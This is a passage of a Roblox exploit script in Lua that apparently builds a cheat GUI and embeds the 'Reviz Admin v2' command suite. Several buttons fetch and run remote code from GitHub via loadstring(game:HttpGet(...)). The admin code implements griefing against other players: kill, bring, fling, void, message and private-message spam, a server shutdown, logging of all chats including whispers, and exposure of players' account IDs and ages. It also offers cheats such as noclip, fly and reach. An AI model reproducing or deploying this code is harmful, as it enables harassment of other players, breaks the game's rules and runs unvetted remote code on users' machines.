ChaosDeusSword.TextColor3 = Color3.fromRGB(255, 255, 255)
ChaosDeusSword.TextSize = 17.000
ChaosDeusSword.MouseButton1Down:connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/sword/main/Chaos%20Deus%20Sword"), true))()
end)

Vereus.Name = "Vereus"
Vereus.Parent = ScriptsFrame
Vereus.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
Vereus.BorderSizePixel = 0
Vereus.Position = UDim2.new(0.551063836, 0, 0.658031166, 0)
Vereus.Size = UDim2.new(0, 166, 0, 50)
Vereus.Font = Enum.Font.Jura
Vereus.Text = "FE VEREUS (R6)"
Vereus.TextColor3 = Color3.fromRGB(255, 255, 255)
Vereus.TextSize = 17.000
Vereus.MouseButton1Down:connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/3dx/main/VEREUS"), true))()
end)

RoadRollerDance.Name = "RoadRollerDance"
RoadRollerDance.Parent = ScriptsFrame
RoadRollerDance.BackgroundColor3 = Color3.fromRGB(62, 180, 137)
RoadRollerDance.BorderSizePixel = 0
RoadRollerDance.Position = UDim2.new(0.551063836, 0, 0.367875636, 0)
RoadRollerDance.Size = UDim2.new(0, 166, 0, 50)
RoadRollerDance.Font = Enum.Font.Jura
RoadRollerDance.Text = "ROAD ROLLER DANCE"
RoadRollerDance.TextColor3 = Color3.fromRGB(255, 255, 255)
RoadRollerDance.TextSize = 17.000
RoadRollerDance.MouseButton1Down:connect (function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/KRNL2/rm/main/Road%20Roller%20Dance"), true))()
end)

-- Scripts:

local function DTUMP_fake_script() -- bar.LocalScript 
	local script = Instance.new('LocalScript', bar)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
	counter = 0
	
	while wait(0.1)do
		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	
		counter = counter + 0.01
	end
end
coroutine.wrap(DTUMP_fake_script)()
local function DQZLQDA_fake_script() -- ScriptsButton.LocalScript 
	local script = Instance.new('LocalScript', ScriptsButton)

	script.Parent.MouseButton1Click:Connect (function()
		script.Parent.Parent.Parent.ExtrasFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.ScriptsFrame.Visible = true
	end)
end
coroutine.wrap(DQZLQDA_fake_script)()
local function SOKM_fake_script() -- bar_2.LocalScript 
	local script = Instance.new('LocalScript', bar_2)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
	counter = 0
	
	while wait(0.1)do
		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	
		counter = counter + 0.01
	end
end
coroutine.wrap(SOKM_fake_script)()
local function QQXH_fake_script() -- CreditsButton.LocalScript 
	local script = Instance.new('LocalScript', CreditsButton)

	script.Parent.MouseButton1Click:Connect (function()
		script.Parent.Parent.Parent.ExtrasFrame.Visible = false
		script.Parent.Parent.Parent.CreditsFrame.Visible = true
		script.Parent.Parent.Parent.ScriptsFrame.Visible = false
	end)
end
coroutine.wrap(QQXH_fake_script)()
local function KNUFX_fake_script() -- bar_3.LocalScript 
	local script = Instance.new('LocalScript', bar_3)

	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
	counter = 0
	
	while wait(0.1)do
		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	
		counter = counter + 0.01
	end
end
coroutine.wrap(KNUFX_fake_script)()
local function OTBCOV_fake_script() -- ExtrasButton.LocalScript 
	local script = Instance.new('LocalScript', ExtrasButton)

	script.Parent.MouseButton1Click:Connect (function()
		script.Parent.Parent.Parent.ExtrasFrame.Visible = true
		script.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.ScriptsFrame.Visible = false
	end)
end
coroutine.wrap(OTBCOV_fake_script)()
end)
Tab3Section:NewButton("Admin", "Opens a Admin GUI", function(HA)
-- Creator: illremember#3799
 
-- Credits to infinite yield, harkinian, dex creators
 
prefix = ";"
wait(0.3)
Commands = {
    '[-] Reviz Admin v2 commands',
    '[-] cmdbar is shown when ; is pressed.',
    '[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player',
    '[2] bring [plr] -- You need a tool! Will bring player to you',
    '[3] spin [plr] -- You need a tool! Makes you and the player spin crazy',
    '[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting',
    '[5] attach [plr] -- You need a tool! Attaches you to player',
    '[6] unattach [plr] -- Attempts to unattach you from a player',
    '[7] follow [plr] -- Makes you follow behind the player',
    '[8] unfollow',
    '[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air',
    '[10] trail [plr] -- The opposite of follow, you stay infront of player',
    '[11] untrail',
    '[12] orbit [plr] -- Makes you orbit the player',
    '[13] unorbit',
    '[14] fling [plr] -- Makes you fling the player',
    '[15] unfling',
    '[16] fecheck -- Checks if the game is FE or not',
    '[17] void [plr] -- Teleports player to the void',
    '[18] noclip -- Gives you noclip to walk through walls',
    '[19] clip -- Removes noclip',
    '[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default',
    '[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default',
    '[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default',
    '[23] default -- Changes your speed, jumppower and hipheight to default values',
    '[24] annoy [plr] -- Loop teleports you to the player',
    '[25] unannoy',
    '[26] headwalk [plr] -- Loop teleports you to the player head',
    '[27] unheadwalk',
    '[28] nolimbs -- Removes your arms and legs',
    '[29] god -- Gives you FE Godmode',
    '[30] drophats -- Drops your accessories',
    '[31] droptool -- Drops any tool you have equipped',
    '[32] loopdhats -- Loop drops your accessories',
    '[33] unloopdhats',
    '[34] loopdtool -- Loop drops any tools you have equipped',
    '[35] unloopdtool',
    '[36] invisible -- Gives you invisibility CREDIT TO TIMELESS',
    '[37] view [plr] -- Changes your camera to the player character',
    '[38] unview',
    '[39] goto [plr] -- Teleports you to player',
    '[40] fly -- Allows you to fly, credit to Infinite Yield',
    '[41] unfly',
    '[42] chat [msg] -- Makes you chat a message',
    '[43] spam [msg] -- Spams a message',
    '[44] unspam',
    '[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second',
    '[46] pmspam [plr] -- Spams a player in private message',
    '[47] unpmspam',
    '[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you',
    '[49] uncfreeze [plr]',
    '[50] unlockws -- Unlocks the workspace',
    '[51] lockws -- Locks the workspace',
    '[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you',
    '[53] pstand -- Enables platform stand',
    '[54] unpstand -- Disables platform stand',
    '[55] blockhead -- Removes your head mesh',
    '[56] sit',
    '[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name',
    '[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided',
    '[59] hypertotal -- Loads in my FE GUI Hypertotal',
    '[60] cmds -- Prints all commands',
    '[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats',
    '[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool',
    '[63] spinner -- Makes you spin',
    '[64] nospinner',
    '[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom',
    '[66] noreach -- Removes reach, must have tool equipped',
    '[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying',
    '[68] tp me [plr] -- Alternative to goto',
    '[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player',
    '[70] uncbring',
    '[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players',
    '[72] givetool [plr] -- Gives the tool you have equipped to the player',
    '[73] glitch [plr] -- Glitches you and the player, looks very cool',
    '[74] unglitch -- Unglitches you',
    '[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode',
    '[76] explorer -- Loads up DEX',
    '[77] reset -- Resets your character.',
    '[78] anim [id] -- Applies an animation on you, must be created by ROBLOX',
    '[79] animgui -- Loads up Energize animations GUI',
    '[80] savepos -- Saves your current position',
    '[81] loadpos -- Teleports you to your saved position',
    '[82] bang [plr] -- 18+ will not work if you have FE Godmode on',
    '[83] unbang',
    '[84] delcmdbar -- Removes the command bar completely',
    '[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model',
    '[86] shutdown -- Uses harkinians script to shutdown server',
    '[87] respawn -- If grespawn doesnt work you can use respawn',
    '[88] delobj [obj] -- Deletes a certain brick in workspace, client sided',
    '[89] getplrs -- Prints all players in game',
    '[90] deldecal -- Deletes all decals client sided',
    '[91] opfinality -- Loads in my FE GUI Opfinality',
    '[92] remotes -- Prints all remotes in the game in the console when added',
    '[93] noremotes -- Stops printing remotes',
    '[94] tpdefault -- Stops all loop teleports to a player',
    '[95] stopsit -- Will not allow you to sit',
    '[96] gosit -- Allows you to sit',
    '[97] clicktp -- Enables click tp',
    '[98] noclicktp -- Disables click tp',
    '[99] toolson -- If any tools are dropped in the workspace you will automatically get them',
    '[100] toolsoff -- Stops ;toolson',
    '[101] version -- Gets the admin version',
    '[102] state [num] -- Changes your humanoid state, ;unstate to stop.',
    '[103] gravity [num] -- Changes workspace gravity default is 196.2',
    '[104] pgs -- Checks if the game has PGSPhysicsSolverEnabled enabled',
    '[105] clickdel -- Delete any block you press q on, client sided',
    '[106] noclickdel -- Stops clickdel',
    '[107] looprhats -- Loop removes mesh of your hats/loop block hats',
    '[108] unlooprhats -- Stops loop removing mesh',
    '[109] looprtool -- Loop removes mesh of your tool/loop block tools',
    '[110] unlooprtool -- Stops loop removing mesh',
    '[111] givealltools [plr] -- Gives all the tools you have in your backpack to the player',
    '[112] age [plr] -- Makes you chat the account age of the player',
    '[113] id [plr] -- Makes you chat the account ID of the player',
    '[114] .age [plr] -- Privately shows you the account age of the player',
    '[115] .id [plr] -- Privately shows you the account ID of the player',
    '[116] gameid -- Shows the game ID',
    '[117] removeinvis -- Removes all invisible walls/parts, client sided',
    '[118] removefog -- Removes fog, client sided',
    '[119] disable -- Disables your character by removing humanoid',
    '[120] enable -- Enables your character by adding humanoid',
    '[121] prefix [key] -- Changes the prefix used, default is ;',
    '[122] ;resetprefix -- Resets the prefix to ; incase you change it to an unusable prefix. Say exactly ";resetprefix" to do this command, no matter what your prefix is set to.',
    '[123] flyspeed [num] -- Change your fly speed, default is 1',
    '[124] carpet [plr] -- Makes you a carpet for a player, will not work if FE Godmode is on',
    '[125] uncarpet -- Stops carpet player',
    '[126] stare [plr] -- Turns your character to stare at another player',
    '[127] unstare -- Stops stare player',
    '[128] logchat -- Logs all chat (including /e and whispers) of all players',
    '[129] unlogchat -- Disables logchat',
    '[130] fixcam -- Fixes/resets your camera',
    '[131] unstate -- Stops changing state',
}
speedget = 1
 
lplayer = game:GetService("Players").LocalPlayer
 
lplayer.CharacterAdded:Connect(function(character)
    spin = false
    flying = false
    staring = false
    banpl = false
end)
 
function change()
    prefix = prefix
    speedfly = speedfly
end
 
function GetPlayer(String) -- Credit to Timeless/xFunnieuss
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            table.insert(Found,v)
        end
    elseif strl == "others" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end  
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
 
local Mouse = lplayer:GetMouse()
 
spin = false
followed = false
traill = false
noclip = false
annoying = false
hwalk = false
droppinghats = false
droppingtools = false
flying = false
spamdelay = 1
spamming = false
spammingpm = false
cbringing = false
remotes = true
added = true
binds = false
stopsitting = false
clickgoto = false
gettingtools = false
removingmeshhats = false
removingmeshtool = false
clickdel = false
staring = false
chatlogs = false
banpl = false
changingstate = false
statechosen = 0
 
adminversion = "Reviz Admin by illremember, Version 2.0"
 
flying = false
speedfly = 1
 
function plrchat(plr, chat)
print(plr.Name..": "..tick().."\n"..chat)
end
 
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
v.Chatted:connect(function(chat)
if chatlogs then
plrchat(v, chat)
end
end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
plr.Chatted:connect(function(chat)
if chatlogs then
plrchat(plr, chat)
end
end)
end)
 
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CMDBAR = Instance.new("TextBox")
ScreenGui.Parent = game:GetService("CoreGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.3, 0.1, 0.1)
Frame.BackgroundTransparency = 0.3
Frame.Position = UDim2.new(0.5, 0, 0, 10)
Frame.Size = UDim2.new(0, 200, 0, 40)
Frame.Active = true
Frame.Draggable = true
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = Frame
CMDBAR.BackgroundColor3 = Color3.new(0.105882, 0.164706, 0.207843)
CMDBAR.BackgroundTransparency = 0.20000000298023
CMDBAR.Size = UDim2.new(0, 180, 0, 20)
CMDBAR.Position = UDim2.new(0.05, 0, 0.25, 0)
CMDBAR.Font = Enum.Font.SourceSansLight
CMDBAR.FontSize = Enum.FontSize.Size14
CMDBAR.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CMDBAR.TextScaled = true
CMDBAR.TextSize = 14
CMDBAR.TextWrapped = true
CMDBAR.Text = "Press ; to type, Enter to execute"
 
local CMDS = Instance.new("ScreenGui")
local CMDSFRAME = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local closegui = Instance.new("TextButton")
CMDS.Name = "CMDS"
CMDS.Parent = game:GetService("CoreGui")
CMDSFRAME.Name = "CMDSFRAME"
CMDSFRAME.Parent = CMDS
CMDSFRAME.Active = true
CMDSFRAME.BackgroundColor3 = Color3.new(0.223529, 0.231373, 0.309804)
CMDSFRAME.BorderSizePixel = 0
CMDSFRAME.Draggable = true
CMDSFRAME.Position = UDim2.new(0, 315, 0, 100)
CMDSFRAME.Size = UDim2.new(0, 275, 0, 275)
CMDSFRAME.Visible = false
ScrollingFrame.Parent = CMDSFRAME
ScrollingFrame.BackgroundColor3 = Color3.new(0.160784, 0.160784, 0.203922)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0729999989, 0)
ScrollingFrame.Size = UDim2.new(1.04999995, 0, 0.92900002, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(0.930000007, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.FontSize = Enum.FontSize.Size18
TextLabel.Text = "[-] cmdbar is shown when ; is pressed.,\n[1] kill [plr] -- You need a tool! Will kill the player, use rkill to kill you and player,\n[2] bring [plr] -- You need a tool! Will bring player to you,\n[3] spin [plr] -- You need a tool! Makes you and the player spin crazy,\n[4] unspin -- Use after using spin cmd and dying, so you stop loop teleporting,\n[5] attach [plr] -- You need a tool! Attaches you to player,\n[6] unattach [plr] -- Attempts to unattach you from a player,\n[7] follow [plr] -- Makes you follow behind the player,\n[8] unfollow,\n[9] freefall [plr] -- You need a tool! Teleports you and the player up into the air,\n[10] trail [plr] -- The opposite of follow, you stay infront of player,\n[11] untrail,\n[12] orbit [plr] -- Makes you orbit the player,\n[13] unorbit,\n[14] fling [plr] -- Makes you fling the player,\n[15] unfling,\n[16] fecheck -- Checks if the game is FE or not,\n[17] void [plr] -- Teleports player to the void,\n[18] noclip -- Gives you noclip to walk through walls,\n[19] clip -- Removes noclip,\n[20] speed [num]/ws [num] -- Changes how fast you walk 16 is default,\n[21] jumppower [num]/jp [num] -- Changes how high you jump 50 is default,\n[22] hipheight [num]/hh [num] -- Changes how high you float 0 is default,\n[23] default -- Changes your speed, jumppower and hipheight to default values,\n[24] annoy [plr] -- Loop teleports you to the player,\n[25] unannoy,\n[26] headwalk [plr] -- Loop teleports you to the player head,\n[27] unheadwalk,\n[28] nolimbs -- Removes your arms and legs,\n[29] god -- Gives you FE Godmode,\n[30] drophats -- Drops your accessories,\n[31] droptool -- Drops any tool you have equipped,\n[32] loopdhats -- Loop drops your accessories,\n[33] unloopdhats,\n[34] loopdtool -- Loop drops any tools you have equipped,\n[35] unloopdtool,\n[36] invisible -- Gives you invisibility CREDIT TO TIMELESS,\n[37] view [plr] -- Changes your camera to the player character,\n[38] unview,\n[39] goto [plr] -- Teleports you to player,\n[40] fly -- Allows you to fly,\n[41] unfly,\n[42] chat [msg] -- Makes you chat a message,\n[43] spam [msg] -- Spams a message,\n[44] unspam,\n[45] spamwait [num] -- Changes delay of chatting a message for the spam command in seconds default is 1 second,\n[46] pmspam [plr] -- Spams a player in private message,\n[47] unpmspam,\n[48] cfreeze [plr] -- Freezes a player on your client, they will only be frozen for you,\n[49] uncfreeze [plr],\n[50] unlockws -- Unlocks the workspace,\n[51] lockws -- Locks the workspace,\n[52] btools -- Gives you btools that will only show to you useful for deleting certain blocks only for you,\n[53] pstand -- Enables platform stand,\n[54] unpstand -- Disables platform stand,\n[55] blockhead -- Removes your head mesh,\n[56] sit,\n[57] bringobj [obj] -- Only shows on client, brings an object/part to you constantly, can be used to bring healing parts, weapons, money etc, type in exact name,\n[58] wsvis [num] -- Changes visibility of workspace parts, num should be between 0 and 1, only shows client sided,\n[59] hypertotal -- Loads in my FE GUI Hypertotal,\n[60] cmds -- Prints all commands,\n[61] rmeshhats/blockhats -- Removes the meshes of all your accessories aka block hats,\n[62] rmeshtool/blocktool -- Removes the mesh of the tool you have equipped aka block tool,\n[63] spinner -- Makes you spin,\n[64] nospinner,\n[65] reach [num] -- Gives you reach, mostly used for swords, say ;reachd for default and enter number after for custom,\n[66] noreach -- Removes reach, must have tool equipped,\n[67] rkill [plr] -- Kills you and the player, use kill to just kill the player without dying,\n[68] tp me [plr] -- Alternative to goto,\n[69] cbring [plr] -- Brings player infront of you, shows only on client, allows you to do damage to player,\n[70] uncbring,\n[71] swap [plr] -- You need a tool! Swaps players position with yours and your position with players,\n[72] givetool [plr] -- Gives the tool you have equipped to the player,\n[73] glitch [plr] -- Glitches you and the player, looks very cool,\n[74] unglitch -- Unglitches you,\n[75] grespawn -- Alternative to normal respawn and usually works best for when you want to reset with FE Godmode,\n[76] explorer -- Loads up DEX,\n[77] reset -- Resets your character.,\n[78] anim [id] -- Applies an animation on you, must be created by ROBLOX,\n[79] animgui -- Loads up Energize animations GUI,\n[80] savepos -- Saves your current position,\n[81] loadpos -- Teleports you to your saved position,\n[82] bang [plr] -- 18+,\n[83] unbang,\n[84] delcmdbar -- Removes the command bar completely,\n[85] bringmod [obj] -- Brings all the parts in a model, client only, comes from ;bringobj enter exact name of model,\n[86] shutdown -- Uses harkinians script to shutdown server,\n[87] respawn -- If grespawn doesnt work you can use respawn,\n[88] delobj [obj] -- Deletes a certain brick in workspace, client sided,\n[89] getplrs -- Prints all players in game,\n[90] deldecal -- Deletes all decals client sided,\n[91] opfinality -- Loads in my FE GUI Opfinality,\n[92] remotes -- Prints all remotes in the game in the console when added,\n[93] noremotes -- Stops printing remotes,\n[94] tpdefault -- Stops all loop teleports to a player,\n[95] stopsit -- Will not allow you to sit,\n[96] gosit -- Allows you to sit,\n[97] clicktp -- Enables click tp,\n[98] noclicktp -- Disables click tp,\n[99] toolson -- If any tools are dropped in the workspace you will automatically get them,\n[100] toolsoff -- Stops ;toolson,\n[101] version -- Gets the admin version, \n This list of commands is NOT showing everything, go to my thread in the pastebin link to see ALL commands."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 15
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top
closegui.Name = "closegui"
closegui.Parent = CMDSFRAME
closegui.BackgroundColor3 = Color3.new(0.890196, 0.223529, 0.0588235)
closegui.BorderSizePixel = 0
closegui.Position = UDim2.new(0.995000005, 0, 0, 0)
closegui.Size = UDim2.new(0.0545952693, 0, 0.0728644878, 0)
closegui.Font = Enum.Font.SourceSansBold
closegui.FontSize = Enum.FontSize.Size24
closegui.Text = "X"
closegui.TextColor3 = Color3.new(1, 1, 1)
closegui.TextSize = 20
 
closegui.MouseButton1Click:connect(function()
    CMDSFRAME.Visible = false
end)
 
game:GetService('RunService').Stepped:connect(function()
    if spin then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[spinplr.Name].Character.HumanoidRootPart.CFrame
    end
    if followed then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * -5
    end
    if traill then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame + game:GetService("Players")[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * 5
    end
    if annoying then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[annplr.Name].Character.HumanoidRootPart.CFrame
    end
    if hwalk then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[hdwplr.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
    end
    if staring then
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(lplayer.Character.Torso.Position, game:GetService("Players")[stareplr.Name].Character.Torso.Position)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if noclip then
        if lplayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            lplayer.Character.Head.CanCollide = false
            lplayer.Character.Torso.CanCollide = false
            lplayer.Character["Left Leg"].CanCollide = false
            lplayer.Character["Right Leg"].CanCollide = false
        else
            lplayer.Character.Humanoid:ChangeState(11)
        end
    end
    if changingstate then
        lplayer.Character.Humanoid:ChangeState(statechosen)
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if droppinghats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Parent = workspace
            end
        end
    end
    if droppingtools then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Parent = workspace
            end
        end
    end
    if removingmeshhats then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if removingmeshtool then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if banpl then
        lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[bplrr].Character.HumanoidRootPart.CFrame
    end
end)
game:GetService('RunService').Stepped:connect(function()
    if stopsitting then
        lplayer.Character.Humanoid.Sit = false
    end
end)
 
plr = lplayer
hum = plr.Character.HumanoidRootPart
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == "e" then
        if mouse.Target then
            if clickgoto then
                hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
            elseif clickdel then
                mouse.Target:Destroy()
            end
        end
    end
end)
 
game:GetService("Workspace").ChildAdded:connect(function(part)
    if gettingtools then
        if part:IsA("Tool") then
            part.Handle.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        end
    end
end)
 
lplayer.Chatted:Connect(function(msg)
    if string.sub(msg, 1, 6) == (prefix.."kill ") then
        if string.sub(msg, 7) == "me" then
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                wait(0.7)
                tp(lplayer,game:GetService("Players")[v.Name])
                wait(0.7)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."bring ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
            end
            end
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.2)
            tp(game:GetService("Players")[v.Name], lplayer)
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.5)
            getout(lplayer, game:GetService("Players")[v.Name])
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 6) == (prefix.."spin ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            lplayer.Character.Animate.Disabled = false
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            spinplr = v
            wait(0.5)
            spin = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unspin") then
        spin = false
    end
    if string.sub(msg, 1, 8) == (prefix.."attach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            attplr = v
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."unattach ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 11))) do
            local function getout(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            getout(lplayer, game:GetService("Players")[v.Name])
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."follow ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            followed = true
            flwplr = v
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unfollow") then
        followed = false
